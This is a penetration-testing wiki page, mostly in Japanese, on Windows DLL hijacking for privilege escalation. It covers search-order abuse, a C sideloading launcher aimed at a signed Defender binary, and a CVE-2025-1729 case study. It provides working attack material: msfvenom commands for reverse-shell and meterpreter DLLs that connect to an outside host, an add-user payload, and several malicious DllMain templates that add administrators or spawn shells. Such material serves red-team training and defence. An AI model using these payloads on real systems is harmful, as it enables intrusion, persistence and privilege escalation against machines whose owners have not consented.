# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL をロードさせるよう操作することを指します。この用語は **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術を包含します。主にコード実行、永続化の確保、そして稀に privilege escalation に利用されます。ここでは escalation に焦点を当てていますが、hijacking の手法自体は目的にかかわらず一貫しています。

### 一般的な手法

DLL hijacking にはいくつかの手法があり、それぞれアプリケーションの DLL ロード戦略に応じて有効性が変わります:

1. **DLL Replacement**: 正規の DLL を悪意あるものと差し替える。元の DLL の機能を保持するために DLL Proxying を使うことがある。
2. **DLL Search Order Hijacking**: 正規の DLL より先に検索されるパスに悪意ある DLL を置き、アプリケーションの検索順序を悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL をロードしようとしたときに読み込まれるよう、悪意ある DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` のような検索パラメータを変更して、アプリケーションを悪意ある DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規の DLL を悪意ある DLL に置き換える手法。しばしば DLL side-loading と関連付けられる。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともにユーザー制御下のディレクトリに悪意ある DLL を置く。Binary Proxy Execution 技術に似ている。

## 欠落している Dlls の検出

システム内で欠落している Dlls を見つける最も一般的な方法は [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を sysinternals から実行し、次の 2 つのフィルタを設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間 実行したままにします。\
特定の実行ファイル内の **missing dll** を探している場合は、**"Process Name" "contains" "\<exec name>"** のような別のフィルタを設定し、実行してからイベントのキャプチャを停止してください。

## 欠落した Dlls の悪用

privilege escalation を行うために最も良いチャンスは、privilege を持つプロセスがロードしようとする dll を、そのプロセスが検索する場所のいずれかに書き込めることです。したがって、dll が元の dll のあるフォルダよりも先に検索されるフォルダに dll を書き込める（奇妙なケース）か、dll が検索されるフォルダに書き込めて元の dll がどのフォルダにも存在しない、という状況を作れれば成功します。

### Dll 検索順序

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) に、Dll がどのようにロードされるかが具体的に記載されています。

Windows アプリケーションは、あらかじめ定義された一連の検索パスに従って DLL を探します。悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置すると、正規の DLL より先に読み込まれてしまい、DLL hijacking の問題が発生します。これを防ぐ解決策は、アプリケーションが必要とする DLL を参照する際に絶対パスを使用することです。

以下は 32-bit システムでの DLL 検索順序です:

1. アプリケーションがロードされたディレクトリ。
2. system directory。パスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16-bit system directory。パスを取得する関数はないが、検索されます。(_C:\Windows\System_)
4. Windows directory。パスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。
1. (_C:\Windows_)
5. カレントディレクトリ。
6. PATH 環境変数に列挙されているディレクトリ。App Paths レジストリキーで指定された per-application path は含まれません。App Paths キーは DLL 検索パスの計算時には使用されません。

これは SafeDllSearchMode が有効な場合のデフォルト検索順序です。無効にするとカレントディレクトリが 2 番目に上がります。この機能を無効にするには、HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode のレジストリ値を作成して 0 に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** で呼ばれると、検索は LoadLibraryEx がロードしている実行モジュールのディレクトリから開始されます。

最後に、dll が名前だけでなく絶対パスを指定してロードされることがある点に注意してください。その場合、その dll は指定されたパスでのみ検索されます（その dll に依存関係がある場合、それらは名前でロードされたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### RTL_USER_PROCESS_PARAMETERS.DllPath を使った sideloading の強制

新規作成プロセスの DLL 検索パスに決定論的に影響を与える高度な方法は、ntdll のネイティブ API を使ってプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、ターゲットプロセスがインポート DLL を名前で解決する（絶対パスでなく、safe ロードフラグを使っていない）場合に、そのディレクトリから悪意ある DLL をロードさせることができます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、DllPath にあなたが制御するフォルダ（例: dropper/unpacker が置かれているディレクトリ）を指定する。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが DLL を名前で解決するとき、ローダはこの提供された DllPath を参照し、悪意ある DLL がターゲット EXE と共置されていなくても確実に sideloading できるようになる。

Notes/limitations
- これは作成される子プロセスに影響し、現在のプロセスのみを影響する SetDllDirectory とは異なります。
- ターゲットは名前で DLL をインポートまたは LoadLibrary している必要があります（絶対パスを使っておらず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していない）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。Forwarded exports と SxS は優先順位を変える可能性があります。

最小限の C の例 (ntdll、ワイド文字列、簡略化したエラーハンドリング):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

うん、要件を見つけるのはややこしい。**デフォルトでは権限を持つ実行ファイルが DLL を欠いているのを見つけるのは奇妙**だし、**system path フォルダに書き込み権限があるのはさらに奇妙**（通常はない）。しかし、設定ミスのある環境ではこれは可能だ。  
もし運良く要件を満たす状況を見つけたら、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認するとよい。プロジェクトの**main goal is bypass UAC**だが、そこで自分の環境向けの **PoC** の Dll hijaking が見つかるかもしれない（おそらく書き込み権限のあるフォルダのパスを変更するだけで使える）。

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダの権限を確認してください**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
executable の imports と dll の exports も次のコマンドで確認できます:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
書き込み権限がある **System Path folder** を使って **abuse Dll Hijacking to escalate privileges** するための完全なガイドは、次を参照してください：

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) は system PATH 内の任意のフォルダに書き込み権限があるかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ および _Write-HijackDll_ があります。

### Example

利用可能なシナリオを見つけた場合、成功裏に悪用するために最も重要な点の一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートする **dll を作成すること** です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** 実行用の dll hijacking に焦点を当てたこの dll hijacking の研究内には、**how to create a valid dll** の例があります: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
また、**next sectio**n には、**basic dll codes** がいくつかあり、**templates** として、あるいは **dll with non required functions exported** を作成するための参考になります。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に、**Dll proxy** は読み込まれたときに **悪意あるコードを実行** できる Dll であり、同時に実際のライブラリへのすべての呼び出しを中継することで期待どおりに **expose** し **work** します（すべての呼び出しを **relaying all the calls to the real library**）。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、対象の実行ファイルを指定して proxify したいライブラリを選択し **generate a proxified dll** したり、Dll を指定して **generate a proxified dll** を行うことができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86、x64版は見つかりませんでした):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

注意: 場合によっては、コンパイルした Dll はターゲットプロセスに読み込まれるために **複数の関数をエクスポートする必要がある** ことがあります。これらの関数が存在しないと、**binary はそれらをロードできず**、**exploit は失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## ケーススタディ: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この事例は、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking**（追跡番号 **CVE-2025-1729**）を示します。

### 脆弱性の詳細

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオンユーザーのコンテキストで毎日午前9:30に実行されます。
- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL Search Behavior**: まず作業ディレクトリから `hostfxr.dll` をロードしようとし、見つからない場合は "NAME NOT FOUND" をログに記録します。これはローカルディレクトリが優先検索されることを示します。

### Exploit Implementation

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを配置することで、欠落する DLL を悪用してユーザーのコンテキストでコード実行を達成できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーのコンテキストでスケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしていると、悪意のある DLL は管理者のセッションで medium integrity で実行される。
4. 標準的な UAC bypass テクニックを連鎖させ、medium integrity から SYSTEM 権限へ昇格させる。

### Mitigation

Lenovo released UWP version **1.12.54.0** via the Microsoft Store, which installs TPQMAssistant under `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, removes the vulnerable scheduled task, and uninstalls the legacy Win32 components.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
